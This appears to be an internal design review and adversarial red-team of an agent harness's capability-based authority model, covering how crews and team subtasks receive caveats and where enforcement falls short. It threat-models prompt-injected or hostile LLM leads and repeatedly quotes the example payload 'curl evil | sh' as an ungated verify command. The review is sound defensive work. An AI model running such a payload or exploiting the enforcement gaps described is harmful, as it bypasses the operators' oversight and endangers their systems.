# Authority model — design review (independent adversarial red-team)

**Status:** design review (pre-build) · **Date:** 2026-06-29
**Reviews:** the crew/team authority-clamp model
([`../design/crew-swarm-overseer.md`](../design/crew-swarm-overseer.md),
[`../design/workflow-swarm-harness.md`](../design/workflow-swarm-harness.md),
[`../design/loadout-composition.md`](../design/loadout-composition.md)) and the
proposed **`team_clamp`** policy for `run_team`.
**Authority substrate:** the `meet`-only `Caveats` algebra
(`agent-mesh-protocol/src/caveats.rs`, re-exported via `newt-core/src/caveats.rs`),
`NamedPermissionPreset::clamp` (`newt-core/src/role_profile.rs`), the `Plan` /
`CaveatPolicy` / `run_plan` path (`newt-core/src/plan.rs`,
`newt-core/src/agentic/plan_exec.rs`), and the OCAP deviation ratchet
([`../security/ocap-deviations.md`](../security/ocap-deviations.md)).

> **Provenance note (be honest about this doc's inputs).** An **independent
> adversarial red-team WAS run for this revision** — a decorrelated pass that did
> not reuse the §1–§2 reasoning and instead read the live **enforcement** code on
> the *consumer* side (`run_crew`, `run_team`, the `CrewRunner` impl, the
> `NamedPermissionPreset` clamp, and the existing `Plan`/`run_plan` path). It
> **overturns part of the earlier conclusion**: the previous pass audited the
> authority-routing *algebra* and the *producer* (`run_team` threading caveats) and
> declared `team_clamp` a strict improvement; the red-team shows the *consumer*
> honors only ~1–2 of the 6 caveat axes and never actually attenuates, so clamping
> the other axes changes nothing until enforcement lands first. The full findings
> (M1–M7 + M-extra) are in **§7**. One correction to the red-team's own first draft
> is folded in: **exec IS enforced at the dispatch boundary** for the top-level
> `crew` arg's `verify` (`newt-cli/src/crew_runner.rs:276`), so the consumer today
> honors **`fs_write` + top-level-`exec`**, not "only `fs_write`" as the red-team
> first wrote. Findings re-derived from the corpus in the earlier pass are still
> marked *(corpus)*; live-code findings are *(live)*.

---

## Executive summary

**The load-bearing gap is NOT the flat shared-caveats alone (T1).** The deeper,
verified gap is that **crew authority is never attenuated and is *enforced* on only
~1–2 of the 6 `Caveats` axes — while the public docstrings claim full
`meet`-attenuation.** Concretely:

- `crew_runner.rs` contains **no `.meet()`** at all: a dispatched crew runs at the
  **full session grant**, not a narrowed sub-grant (§7 M2). The `crew_tool.rs:13-15`
  / `:87` docstrings — "runs every spawned crew under `meet`-attenuated caveats
  (never the session's full grant)" / "cannot exceed your authority" — are **false
  as written** (true only as the trivial equality, not as attenuation).
- `run_crew` consults caveats on exactly **one** axis — `fs_write`
  (`newt-scheduler/src/crew.rs:348`). `fs_read`, `net`, `max_calls`, and
  `valid_for_generation` are **accepted and silently ignored** (§7 M1). `exec` is
  enforced **only** at the dispatch boundary for the *top-level* `crew` arg's
  `verify` (`crew_runner.rs:276`); the **team-mode per-subtask** `verify` bypasses
  that gate entirely (§7 M3).

Therefore the proposed **`team_clamp` is necessary-but-insufficient**: it computes a
tighter clamp on a 6-axis bundle whose consumer honors 1–2 axes. Clamping `fs_read`
or `net` per subtask is **inert** until `run_crew` reads those axes. **Fix the
enforcement floor first** (§3.0), then make the docstrings true by adding a real
`.meet()` in the runner, then route `run_team` through the **already-shipping**
`Plan`/`CaveatPolicy`/`run_plan` mechanism (§7 M4) rather than building a parallel
`team_clamp`. The `meet` *algebra* itself is confirmed a correct greatest-lower-bound
on all 6 axes and is **not** the problem (§7, "Confirmed sound").

---

## 1. What is being reviewed (the proposed design)

The authority model treats an agent as **the one runtime, scoped** — differentiated by
four dials (brains / tools / **authority** / role), where the *authority* dial is an
OCAP `Caveats` bundle. The load-bearing invariant, repeated at every layer, is:

> **Attenuation only. Every authority boundary — tool toggle, loadout, crew dispatch,
> mesh hop — can only `meet` (narrow) the caller's caveats, never widen.**
> (`crew-swarm-overseer.md` §Design-invariant 2.)

Concretely, effective authority is computed as a lattice **meet** (intersection):

```
effective = base.meet(role.caveats).meet(preset.clamp())   // loadout-composition.md
```

- `base` is **harness-minted** ("the harness stamps, the model never asserts", #319/#332);
  the signed `AgentKey` delegation is the unforgeable root.
- `meet` is monotone-narrowing by construction (`agent-mesh-protocol/src/caveats.rs:189`,
  with `meet_never_amplifies` / `meet_is_greatest_lower_bound` property tests, :360–408).
- `NamedPermissionPreset` has **no widening grammar** — only `readonly` / `exec_allow` /
  `deny` / `max_calls`, all clamp-only (`role_profile.rs`). **But** see §7 M6: it cannot
  clamp `fs_read` or `valid_for_generation`, and an empty preset clamps to *top*, not
  bottom.

### 1.1 The `team_clamp` policy (proposed)

`run_team` decomposes a GOAL into ordered subtasks (the lead, an LLM, emits
`{task, verify}` JSON) and runs **a crew per subtask, sequentially over a shared
workspace, stopping at the first block**. The proposed `team_clamp` policy governs
*the authority each subtask's crew receives*:

```
for each subtask st:
    subtask_clamp(st) = least authority that satisfies st's declared needs   // default-deny
    child_caveats     = team_caveats.meet(subtask_clamp(st))                  // ≤ team ceiling
    run_crew(... child_caveats ... st.task)
```

The policy's job is to ensure **no subtask crew ever runs with more authority than the
specific subtask warrants**, and **never more than the team ceiling** the human approved
at gate 2 (roster approval).

> **The gap this review exists to close** *(live)*: today `run_team` threads **one
> shared `caveats`** into every `run_crew` call (`newt-scheduler/src/team.rs:169`).
> There is no `subtask_clamp`, no per-subtask narrowing. Every subtask — including a
> trivial "update the README" step — currently runs at the **full team ceiling**.
> **But the red-team shows the deeper problem is downstream of this** (§7 M1/M2):
> even the *shared* caveats are barely enforced inside `run_crew`, and they are never
> `meet`-attenuated below the *session* grant. The `team_clamp` policy as drafted is
> *net-new producer behavior* that the *consumer* mostly ignores — so it must be
> sequenced **after** the §3.0 enforcement floor.

---

## 2. Threats considered

Each finding: the threat, **how the design answers it**, and an explicit **residual**
(or a noted gap the strengthened design closes in §3). Severity uses the
`ocap-deviations.md` scale (🔴 critical / 🟠 high / 🟡 medium).

> **Read §2 against §7.** The independent red-team verified that several of the
> "how the design answers it" claims below are **not enforced in the live code** —
> the design *intends* them, but the consumer does not honor them yet. Forward
> references are inline.

### T1 — Over-broad child caveats (the flat-clamp gap) 🔴 *(live + corpus)*
**Threat.** `run_team` hands every subtask the full `team_caveats`. A goal that needs
write+exec for *one* subtask grants write+exec to *all* of them, including read-only
steps. A confused or prompt-injected crew on a "harmless" subtask inherits the whole
team's blast radius. (Mirrors `workflow-swarm-harness.md §7` "Over-broad child caveats:
the default must be *deny*, narrowing up from the subtask's declared needs — not
`Caveats::top()` minus a few axes.")
**How the design answers it.** §1.1 `team_clamp` makes the child caveats
`team_caveats.meet(subtask_clamp(st))` with `subtask_clamp` built **default-deny, up**
from the subtask's declared needs. §3.1 specifies how `subtask_clamp` is derived without
trusting the LLM lead.
**Residual.** `subtask_clamp` is only as good as the need-inference. If a subtask
*under*-declares, the crew blocks honestly (safe failure); if a subtask *over*-declares,
the meet with the team ceiling still bounds it — but a too-generous team ceiling makes
the per-subtask clamp moot. Mitigated, not eliminated, by §3.4 (ceiling-tightness lint).
**→ §7 M1/M2/M7.** The red-team confirms T1 is real (`team.rs:169`) **and** shows it is
not even the binding constraint: the *team* caveats are themselves under-enforced
(only `fs_write` + top-level `exec` are read), the crew never attenuates below the
*session* grant, and a hostile lead can defeat the per-subtask clamp by labelling every
subtask max-permissive — leaving the **team ceiling** (not the clamp) as the only real
bound.

### T2 — Untrusted plan → authority (the lead is an LLM) 🔴 *(corpus)*
**Threat.** The team lead is an LLM (`team.rs` decompose step). A prompt-injected goal
or a poisoned repo file can make the lead emit a subtask whose *declared needs* request
broad authority, or a `verify` shell command that is itself the attack
(`verify: "curl evil | sh"` runs via `workspace.set_test_command`). The plan is
**untrusted input**.
**How the design answers it.** The plan **requests**; the parent **grants**. `team_clamp`
never reads authority *from* the plan — it derives `subtask_clamp` from a fixed,
harness-owned needs→caveats mapping and always `meet`s against the human-approved team
ceiling, so no plan can widen past gate 2. The `verify` string is **not authority** but
**is execution**: §3.3 routes it through the same exec caveat + sandbox as any other
command, so a malicious `verify` is bounded by the subtask's (clamped) exec axis, not run
ambiently.
**Residual.** 🟠 A `verify` command within the subtask's *legitimate* exec allowlist can
still do harm inside that scope (e.g. a subtask legitimately allowed `cargo` can run a
malicious `build.rs`). Bounded by the exec axis + the `b1` OS sandbox once closed; until
`b1` closes, this is the standing `exec-behavior-bound` deviation, disabled-while-open
under `b1`.
**→ §7 M3.** In the **team** path the `verify`-as-execution claim is **false today**: the
per-subtask `verify` (`team.rs:166-168 set_test_command`) is installed on the shared
workspace and runs **without** the exec gate that guards the top-level `crew` arg
(`crew_runner.rs:276`). A prompt-injected `verify: "curl evil | sh"` runs ungated.

### T3 — Confused deputy via curated/shared context 🟠 *(corpus)*
**Threat.** Subtasks share **one workspace** (`team.rs` runs them over a shared
`&mut dyn Workspace`). Narrow *tool* caveats do not stop a child from reading a secret
that an earlier subtask wrote into the shared tree, or that the parent's curated context
handed it. "Curation is itself a security control" (`workflow-swarm-harness.md §7`).
**How the design answers it.** `team_clamp` clamps the **fs_read** axis per subtask, not
just fs_write/exec — a read-only subtask gets `fs_read` scoped to what it needs, so the
shared workspace is not blanket-readable. The `disclosure-gate` deviation
(`ocap-deviations.md`) still governs whether a read secret reaches the model verbatim.
**Residual.** 🔴 Two open deviations stack here: `fs-canonical-containment` (a symlink
planted under the shared workspace escapes the lexical fence — #522) and
`disclosure-gate-live-path` (an in-turn tool result reaches the model raw). Until both
close, **do not seed any secret-bearing file into a team's shared workspace.** The
`team_clamp` per-subtask fs_read narrowing *reduces* exposure but does not substitute for
those gates.
**→ §7 M1.** The claimed `fs_read` mitigation is **false today**: `run_crew` reads
navigator-selected files (`newt-scheduler/src/crew.rs:287-292 workspace.read(f)`) with
**no `permits_fs_read` check** whatsoever. Clamping `fs_read` in `team_clamp` is inert
until `run_crew` consults it.

### T4 — Self-proposal / lead-authors-its-own-ceiling 🟠 *(corpus)*
**Threat.** If `subtask_clamp` were derived from the lead's free-text "needs," the lead
(a worker-class LLM) would be **authoring its own authority** — the `sod-proposer-not-worker`
violation (worker_fp == proposer_fp).
**How the design answers it.** §3.1 forbids deriving the clamp from lead-authored prose.
The clamp is computed by the **harness** from a closed enum of subtask *kinds* /
declared-capability *tokens* mapped to presets, never from the lead's natural-language
justification. The lead may *signal* a kind; the harness *decides* the caveats. No
auto-apply of a lead-proposed widening exists (asserted by `ocap-check`).
**Residual.** 🟡 The kind→preset mapping is a trusted, human-owned table; a bug or an
over-generous preset in that table widens silently. Guarded by §3.4 (the `no_top_leak` /
ceiling-tightness regression tests) and code review of the table, not by the algebra.
**→ §7 M7.** Even with a closed-enum kind table, a *hostile* lead simply labels every
subtask with its most-permissive legal `kind`. The kind table bounds *honest* mistakes;
it does **not** bound a hostile lead. The only bound against a hostile lead is the human
team ceiling (§3.4), which is therefore **load-bearing, not advisory**.

### T5 — Mesh-peer trust boundary (remote crew) 🟠 *(corpus)*
**Threat.** A `MeshCrewRunner` subtask runs on someone else's hardware. The signed cert
proves **authority, not honesty** — a malicious peer can leak the prompt/curated context
and return crafted results that steer later subtasks.
**How the design answers it.** Per-hop `meet` means the remote crew's cert chain carries
caveats ≤ the (already clamped) `child_caveats`, so a hostile peer cannot exceed what the
subtask was granted. Results from mesh are treated as **untrusted input** to aggregation;
the harness verify-gate (not the peer's self-report) decides pass/fail.
**Residual.** 🔴 A hostile peer still **sees everything handed to it** (prompt + curated
context) and can return plausible-looking poison. This is irreducible at the authority
layer — it is a *confidentiality + honesty* problem, addressed only by (a) not handing
secrets to untrusted peers (the `b1` "untrusted-remote voice" disabled-while-open bound)
and (b) decorrelated verification. **Standing rule: a genuinely-foreign peer is an
`admit_untrusted_remote()` call gated on `verify_b1()`.**
**→ §7 M5.** The "per-hop `meet`" assumption presumes the local path already attenuates;
it does not (M2). And today's emergent safety — crew members are *toolless* — **voids on
the mesh path** where a remote resident may field tools.

### T6 — Per-child key / cert lifetime & replay 🟡 *(corpus)*
**Threat.** If per-subtask child keys/certs are long-lived, persisted, or logged, a
captured child cert can be **replayed** after the plan completes.
**How the design answers it.** Per-subtask child keys are short-lived and ephemeral;
`expires_at` is set to (at most) the subtask's expected wall-clock; keys are never
persisted or logged. (Mirrors `workflow-swarm-harness.md §7` "Key/cert lifetime.")
**Residual.** 🟡 `run_team` is sequential and in-process today, so there is no minted
per-child cert *yet* — this threat is **latent**, becoming live only when
`MeshCrewRunner` / minted child keys land. Tracked as a precondition for the mesh path,
not a today-gap. **Until child keys exist, the under-enforcement gap (T1 + §7 M1/M2) is
the real exposure, not replay.**

### T7 — `max_calls` / resource-exhaustion across the team 🟡 *(corpus)*
**Threat.** `NamedPermissionPreset.max_calls` bounds calls **per crew**, but a team is N
crews. A team of many subtasks can multiply tool-call budget N× even though each crew is
within its own `max_calls`. No team-wide ceiling exists.
**How the design answers it.** §3.5 adds a **team-level budget** that the per-subtask
`max_calls` must `meet` against (a running team budget, decremented per subtask), so the
team total is bounded, not just each crew.
**Residual.** 🟡 Wall-clock / token cost (vs call count) is still unbounded; a subtask can
burn a large context per call. Out of scope for the authority axis; noted for the
scheduler.
**→ §7 M1.** T7's premise — that `max_calls` bounds calls per crew — is **false**:
`run_crew`'s loop is bounded by `cfg.max_attempts` (`newt-scheduler/src/crew.rs:298`),
**not** `caveats.max_calls`, which `run_crew` never reads. A per-crew `max_calls` is
unenforced today, so a team budget composed of unenforced per-crew budgets is doubly
inert until M1 is fixed.

### T8 — Blocked-subtask state leak / partial-apply 🟡 *(live)*
**Threat.** `run_team` stops at the first block but the **shared workspace already holds
the writes** of all passed subtasks. A later human re-run, or a re-dispatch, inherits
mutated state produced under the *old* (flat) authority — and a blocked subtask may have
left half-applied effects.
**How the design answers it.** The verify-gate per subtask + stop-at-first-block keeps the
tree at a known-good checkpoint (last passed subtask's verify exited 0). `team_clamp` does
not change this; it only narrows authority. Throwaway git worktrees (`fs-canonical-containment`
compensating control) bound the blast radius of partial application.
**Residual.** 🟡 No automatic rollback of a partially-applied blocked subtask; recovery is
the human's (honest `NeedsHumanReview`). Acceptable, but called out so it is not assumed
transactional. **→ §7 M-extra:** worktree isolation bounds the working *tree* but not the
git *ref namespace* — a verifying-but-malicious subtask can still land a branch.

---

## 3. Strengthened design — necessary but not sufficient

The previous revision treated §3 as "the fix." The red-team (§7) shows §3 is **necessary
but not sufficient**: every per-axis clamp it specifies operates on a `Caveats` bundle
whose *consumer* honors only `fs_write` + top-level `exec` and never attenuates below the
session grant. **§3.0 is the precondition; the rest of §3 has no teeth until §3.0 lands.**

### 3.0 Enforcement floor (must land first) — NEW, blocking
Before any per-subtask clamping is meaningful, the **consumer** must honor the axes it is
handed and the runner must actually attenuate:

1. **`run_crew` must consult all enforced axes, not just `fs_write`.** Today the only
   caveat check inside `run_crew` is `permits_fs_write` at
   `newt-scheduler/src/crew.rs:348`. Add: `permits_fs_read` on the navigator-curated
   reads (`crew.rs:287-292`), `permits_exec` on the verify/test command actually run,
   `net` enforcement at any fetch site, and `max_calls` as the loop bound (replacing the
   bare `cfg.max_attempts` at `crew.rs:298`, or `meet`-ing the two).
2. **`crew_runner.rs` must actually `.meet()`.** Today it contains **no `.meet()`**; the
   crew runs at the full session grant (`tools.rs:1898` passes the session `caveats`
   straight to `runner.dispatch`). Attenuate the dispatched crew's caveats below the
   session grant so the `crew_tool.rs:13-15` / `:87` docstrings ("`meet`-attenuated …
   never the session's full grant", "cannot exceed your authority") become **true** —
   today they are false except as the trivial equality.
3. **The team-mode per-subtask `verify` must be exec-gated.** The top-level `crew` arg's
   `verify` is gated at `crew_runner.rs:276`, but the per-subtask `verify` installed via
   `team.rs:166-168 set_test_command` bypasses it. Gate the per-subtask `verify` through
   the same `permits_exec` check (the `plan_exec.rs:118-122` pattern already does this
   correctly — see §3.0a and §7 M4).

**Acceptance test (write it first, TDD):** a crew dispatched with `fs_read = Only([…])`
and `exec = none` is **actually denied** a read outside its `fs_read` scope and **actually
denied** the verify/exec it lacks authority for — asserted at the `run_crew` boundary, not
just at the `Caveats` constructor. This test **fails on today's code** and is the gate for
the rest of §3.

### 3.0a Prefer the existing `Plan` / `CaveatPolicy` / `run_plan` mechanism
An **equivalent, stronger mechanism already ships** and the prior review re-invented it
(§7 M4). `Subtask::to_crew_task(parent)` already computes
`caveats = parent.meet(self.caveat_policy.to_caveats())` (`newt-core/src/plan.rs:271-274`)
— exactly the proposed "the plan requests, the parent grants". `CaveatPolicy::default()`
is **fully-denied on every axis** (`plan.rs:354-364`, tests `omitted_caveat_policy_denies_
every_axis` :412 and `default_policy_lowers_to_a_fully_denied_caveats` :430), and
`run_plan` exec-gates the forwarded `verify` fail-closed (`plan_exec.rs:118-122`).
**Recommendation: route `run_team` through `Plan` / `run_plan` rather than building a
parallel `team_clamp`.** This inherits default-deny, real `meet`-attenuation, and a
correctly exec-gated `verify` for free — and gives one code path to harden, not two.

### 3.1 `subtask_clamp` is harness-derived, default-deny, closed-vocabulary
Derive each subtask's clamp **only** from a harness-owned mapping, never from lead prose:

- The lead's JSON gains an **optional, enumerated** `kind` (or `needs`) token drawn from a
  **closed set** (e.g. `read_only`, `edit`, `build`, `vcs`, `net_fetch`). Unknown/absent ⇒
  the **most restrictive** preset (`readonly`, no exec, no net).
- A static, human-owned `kind → caveats` table lowers each token to a clamp.
- `child_caveats = team_caveats.meet(kind_clamp)`. The lead **signals**; the harness
  **decides**. This satisfies T2 and T4 by construction: no natural-language path widens
  authority, and the worker never authors its own ceiling.

> **Do not lower the kind table through `NamedPermissionPreset::clamp()`** (§7 M6). That
> preset grammar **cannot clamp `fs_read`** (`role_profile.rs:323-325` pins `fs_read` to
> the top of its axis) and **cannot clamp `valid_for_generation`** (`role_profile.rs:200`
> hard-codes `Scope::All`), and an **empty/absent preset clamps to `Caveats::top()`**
> (test `empty_preset_is_identity_clamp`, `role_profile.rs:671-676`) — i.e. a
> preset-derived default is **OPEN**, which *inverts* §3.2's required default-deny. Use the
> `CaveatPolicy` path instead (§3.0a): its defaults are deny on every axis (`plan.rs:354`).

### 3.2 Default-deny, not top-minus
`subtask_clamp` starts from `Caveats`'s **bottom** on the dangerous axes (fs_read=none,
fs_write=none, exec=none, net=none) and only the table lifts specific axes. Add a
regression test mirroring `no_top_leak`: **the team dispatch tree carries zero literal
`Caveats::top()`** and every `run_crew` call inside `run_team` receives caveats `⊑`
`team_caveats` (assert `child.leq(team)` for every subtask). **Note (§7 M6):** if the
clamp is sourced from a preset, an empty preset *is* `top()` — so this test must assert
against the lowered clamp, and the clamp must come from the `CaveatPolicy` (deny-default)
path, not the preset (top-default) path.

### 3.3 `verify` is execution, not a side channel
Route **every** lead-supplied `verify` string — the top-level `crew` arg **and the
team-mode per-subtask** `verify` — through the **same exec caveat + sandbox** as any crew
command. A `verify` outside the subtask's (clamped) exec allowlist is **refused**, not
run. Never pass `verify` to an ambient `bash -c`. The top-level path already does this
(`crew_runner.rs:276`); §3.0 item 3 extends it to the per-subtask path (`team.rs` →
`run_crew`), and `plan_exec.rs:118-122` is the reference for fail-closed forwarding.

### 3.4 Ceiling-tightness check — load-bearing, not advisory
A too-generous **team ceiling** does not merely make per-subtask clamps "moot" — per §7
M7, against a **hostile lead** the team ceiling is the **only** real bound, because a
hostile lead labels every subtask with its most-permissive legal `kind` and flattens the
per-subtask clamp. So the ceiling-tightness check is **promoted from advisory to
load-bearing**: at minimum a hard `ocap-check` lint (block, not warn) when the approved
team ceiling is broader than the **union** of the subtasks' derived clamps, so the human
tightens at gate 2. Treat the team ceiling as the security boundary; treat the per-subtask
clamp as defence-in-depth against an *honest* lead only.

### 3.5 Team-wide budget (close T7)
Carry a team-level `max_calls` budget; each subtask's effective `max_calls` is
`meet(remaining_team_budget, kind_clamp.max_calls)`. Decrement per subtask. The team total
is bounded, not just each crew. **Precondition (§7 M1/T7):** this is inert until `run_crew`
actually enforces `max_calls` as its loop bound (today the loop is bounded by
`cfg.max_attempts`, `crew.rs:298`, and `max_calls` is never read) — fold into §3.0 item 1.

### 3.6 Mesh preconditions (gate T5/T6 before they go live)
The mesh path (`MeshCrewRunner`, minted per-child keys) MUST NOT ship until: (a) child
caveats are minted **after** real attenuation (§3.0) — so the cert chain carries the
clamped, not the session/team, caveats; (b) `expires_at` ≤ subtask wall-clock and keys
are never logged/persisted; (c) `admit_untrusted_remote()` gates any foreign peer on
`verify_b1()`; (d) curated context to a mesh peer assumes the peer sees everything (no
secrets to untrusted peers); (e) a **recursion/depth bound** exists in code (§7 M5) — the
emergent "crew members are toolless" safety voids on the mesh path.

---

## 4. Residual risks (honest, standing)

| # | Residual | Severity | Bound / status |
|---|---|---|---|
| R0 | **`run_crew` enforces only `fs_write` + top-level `exec`; the other axes are accepted & ignored** | 🔴 | §7 M1 — fix in §3.0 item 1 before clamping anything |
| R0b | **Crew runs at the full session grant; `crew_runner.rs` never `.meet()`s; docstrings claim otherwise** | 🔴 | §7 M2 — fix in §3.0 item 2; make `crew_tool.rs:13-15/:87` true |
| R0c | **Team-mode per-subtask `verify` is not exec-gated** (`team.rs:166-168` bypasses `crew_runner.rs:276`) | 🔴 | §7 M3 — fix in §3.0 item 3 / §3.3 |
| R1 | Subtask need-inference can over-declare; a loose **team ceiling** then dominates — and is the *only* bound vs a hostile lead | 🟠 | §7 M7 — §3.4 promoted to load-bearing lint |
| R1b | `NamedPermissionPreset` can't clamp `fs_read`/`valid_for_generation` and defaults to `top()` | 🟠 | §7 M6 — use the `CaveatPolicy` deny-default path (§3.0a/§3.1) |
| R1c | Design re-invents the shipped `Plan`/`CaveatPolicy`/`run_plan` mechanism | 🟠 | §7 M4 — route `run_team` through `run_plan` (§3.0a) |
| R2 | A malicious `verify` *within* a legitimately-granted exec scope | 🟠 | exec axis + `b1` sandbox; `exec-behavior-bound` deviation (open) |
| R3 | Secret written to the **shared workspace** read by a later subtask | 🔴 | `fs-canonical-containment` (#522) + `disclosure-gate-live-path` both OPEN — **no secrets in a team workspace**; also blocked by R0 (fs_read unenforced) |
| R4 | Hostile mesh peer sees curated context / returns poison | 🔴 | irreducible at authority layer; `b1` untrusted-remote bound + decorrelated verify |
| R5 | Symlink under shared workspace escapes the lexical fence | 🟠 | `fs-canonical-containment` OPEN (#522); throwaway worktrees + `b1` backstop |
| R6 | kind→preset table bug widens silently | 🟡 | human-owned table + `no_top_leak`/`leq` tests; not algebra-guaranteed |
| R7 | No transactional rollback of a partially-applied blocked subtask | 🟡 | `NeedsHumanReview` + worktree isolation; recovery is human |
| R8 | No OS sandbox today (`sandbox_kind = none`) | 🔴 | `b1-os-isolation` OPEN (#84) — the in-process monitor is the only barrier; **trusted-code-only on trusted hosts** |
| R9 | **No recursion/depth bound; today's safety is emergent (crew members toolless), voids on mesh** | 🟡 | §7 M5 — add a depth bound (§3.6 e) |
| R10 | **`run_command` interactive grant re-widens (`tools.rs:1990-1992`) without re-applying `exec_floor`; worktree isolates the tree but not the git ref namespace** | 🟡 | §7 M-extra — re-apply `exec_floor` to the widened caveats; bound ref writes |

The `team_clamp` policy **reduces** R1/R3 exposure and **adds no new authority surface**
(it is `meet`-only) — **but only once R0/R0b/R0c are fixed**. Until then it clamps axes the
consumer ignores. It does **not** close R3/R4/R8 — those are the standing OCAP deviations
and remain governed by the ratchet in `ocap-deviations.md`.

---

## 5. Open questions for the owner

1. **Closed vocabulary scope.** What is the initial `kind` token set for subtask clamps
   (§3.1)? Proposed minimum: `read_only | edit | build | vcs | net_fetch`. Does any real
   workflow need a `kind` not expressible as a `CaveatPolicy` (e.g. a scoped network
   allowlist)?
2. **Default on unknown/absent `kind`.** Confirm the safe default is the **most
   restrictive** clamp (readonly, no exec, no net) — i.e. an un-annotated subtask blocks
   honestly rather than inheriting the team ceiling. (This review assumes yes; the
   `CaveatPolicy` path already defaults this way, `plan.rs:354`.)
3. **`verify` as exec (§3.3).** Should `verify` be (a) clamped to the subtask's exec axis,
   (b) restricted to a separate, tighter "verify-only" allowlist, or (c) refused entirely
   unless explicitly allow-listed? Recommendation: (a) now (covering **both** the
   top-level and the per-subtask paths — §3.0 item 3), (b) as the hardening target.
4. **Team ceiling source.** Where is the human-approved **team ceiling** authored — the
   roster (gate 2), a `[team]` preset, or the session base? §3.4's now-load-bearing lint
   needs a single answer for "what the human approved."
5. **`team_clamp` vs `run_plan`.** Given §3.0a / §7 M4, do we **build `team_clamp` at
   all**, or refactor `run_team` to emit a `Plan` and dispatch via `run_plan` (which
   already has default-deny `CaveatPolicy` + a fail-closed exec-gated `verify`)?
   Recommendation: the latter.
6. **Mesh sequencing.** Confirm `MeshCrewRunner` stays gated behind §3.6 (a)–(e),
   including a recursion bound (§7 M5). Should the team path refuse to dispatch a subtask
   to a foreign peer at all until `b1` closes?

---

## 6. Recommendation

**Do NOT build `team_clamp` first.** The independent red-team (§7) shows it would clamp
axes the consumer ignores. Sequence the work as a ratchet:

1. **Land the enforcement floor (§3.0) — blocking, first.** Make `run_crew` consult
   `fs_read` / `exec` / `net` / `max_calls` (not just `fs_write`); make `crew_runner.rs`
   actually `.meet()` so a dispatched crew runs **below** the session grant; gate the
   team-mode per-subtask `verify`. Land it **TDD-first** with the §3.0 acceptance test
   that asserts a crew with `fs_read = Only(…)` and `exec = none` is **actually denied** a
   read/exec — this test **fails on today's code** (only `fs_write` and top-level `exec`
   are honored) and passes after. Update the `crew_tool.rs:13-15` / `:87` docstrings only
   once they are **true**.
2. **Route `run_team` through the existing `Plan` / `run_plan` mechanism (§3.0a, §7 M4).**
   It already implements `caveats = parent.meet(policy)` (`plan.rs:271-274`), a fully-
   denied `CaveatPolicy::default()` (`plan.rs:354`), and a fail-closed exec-gated `verify`
   (`plan_exec.rs:118-122`). Prefer refactoring over building a parallel `team_clamp`.
3. **Only then does per-subtask clamping have teeth.** With (1) and (2) in place,
   per-subtask narrowing (§3.1, sourced from the deny-default `CaveatPolicy` path, **not**
   the top-default preset path — §7 M6) is a real defence-in-depth layer. Promote the
   ceiling-tightness check to a **load-bearing** lint (§3.4, §7 M7): against a hostile
   lead it is the only bound.
4. **Keep the mesh path gated (§3.6),** including a recursion/depth bound (§7 M5) — the
   current emergent safety (toolless crew members) voids on mesh.

Treat R3/R4/R8 as **unchanged standing deviations** — none of this lets us seed secrets
into a team workspace or admit untrusted peers. The `meet` *algebra* is confirmed sound
(§7) and needs no change; the work is entirely on the **enforcement** side.

---

## 7. Independent red-team (decorrelated pass)

A decorrelated review read the live **enforcement** code (the *consumer* of caveats) — not
the algebra and not the producer — and **overturns part of §3's conclusion**. Verdict: **§3
as originally drafted does NOT close the Confused-Deputy bound**, because the bound is
enforced at *consumption* and the consumer honors **~1–2 of the 6 caveat axes** while the
docstrings claim full `meet`-attenuation. Fix enforcement first (§3.0). Findings below;
each carries the verified `file:line`, severity, and status.

### M1 — `run_crew` enforces only `fs_write` (4 of 6 axes accepted & ignored) 🔴
**Finding.** Inside `run_crew` the **only** caveat consultation is `permits_fs_write`
(`newt-scheduler/src/crew.rs:348`, the apply-time partition). `fs_read`, `net`,
`max_calls`, and `valid_for_generation` are accepted in the `&Caveats` parameter and
**silently ignored**. Two stated mitigations are therefore false in code:
- **T3's `fs_read` mitigation is false:** navigator-selected files are read via
  `workspace.read(f)` at `crew.rs:287-292` with **no `permits_fs_read`**.
- **T7's premise is false:** the attempt loop is bounded by `cfg.max_attempts`
  (`crew.rs:298`), **not** `caveats.max_calls`, which is never read.
**Status.** Open; the single most important fix. Clamping any of these axes (T1, T3, §3.5)
is inert until `run_crew` consults them. → §3.0 item 1.

### M2 — Crew runs at the FULL session grant; docstrings falsely claim attenuation 🔴
**Finding.** `crew_runner.rs` contains **no `.meet()`** — a dispatched crew is **not**
narrowed below the caller's grant. `tools.rs:1898` passes the session `caveats` straight
into `runner.dispatch`, and `run_team` threads them unchanged into `run_crew`
(`team.rs:169`). Yet `crew_tool.rs:13-15` claims crews "run … under `meet`-**attenuated**
caveats (never the session's full grant)" and `crew_tool.rs:87` tells the model crews
"cannot exceed your authority." **Those docstrings are false** — true only as the trivial
equality (`x.meet(top) == x`), never as attenuation.
**Correction (folded into the provenance note):** `exec` *is* enforced — but only at the
dispatch boundary for the **top-level** `crew` arg's `verify` (`crew_runner.rs:276`,
`permits_exec`). So the consumer honors **`fs_write` + top-level-`exec`**, not "only
`fs_write`" as the red-team first wrote.
**Status.** Open. Add a real `.meet()` in the runner so the crew runs below the session
grant, then make the docstrings true. → §3.0 item 2.

### M3 — Team-mode per-subtask `verify` is never exec-gated 🔴
**Finding.** The exec gate at `crew_runner.rs:276` covers **only** the single top-level
`crew` arg's `verify` (and the `Plan` path). The team-mode **per-subtask** `verify`,
installed by the lead via `workspace.set_test_command(verify)` (`team.rs:166-168`) and
then run by `run_crew`, **bypasses** that gate. A prompt-injected
`verify: "curl evil | sh"` runs ungated.
**Status.** Open. Gate the per-subtask `verify` through the same `permits_exec` check
(`plan_exec.rs:118-122` is the correct reference). → §3.0 item 3 / §3.3.

### M4 — The design re-invents the existing `Plan` / `CaveatPolicy` / `run_plan` mechanism 🟠
**Finding.** An equivalent, **stronger** mechanism already ships and §3 ignored it.
`Subtask::to_crew_task(parent)` computes `caveats = parent.meet(self.caveat_policy.
to_caveats())` (`newt-core/src/plan.rs:271-274`) — exactly the proposed "parent grants".
`CaveatPolicy::default()` is **fully-denied on every axis** (`plan.rs:354-364`; tests
`omitted_caveat_policy_denies_every_axis` :412, `default_policy_lowers_to_a_fully_denied_
caveats` :430). `run_plan` forwards a `verify` **only** when `task.caveats.permits_exec(v)`,
fail-closed (`plan_exec.rs:118-122`).
**Status.** Open (design). Route `run_team` through `Plan` / `run_plan` rather than
building a parallel `team_clamp`. → §3.0a.

### M5 — No recursion/depth bound; safety is emergent and voids on mesh 🟡
**Finding.** No recursion or depth bound exists in code. Today's safety is **emergent**:
crew members are *toolless* — the navigator/planner/triage roles are pure inference
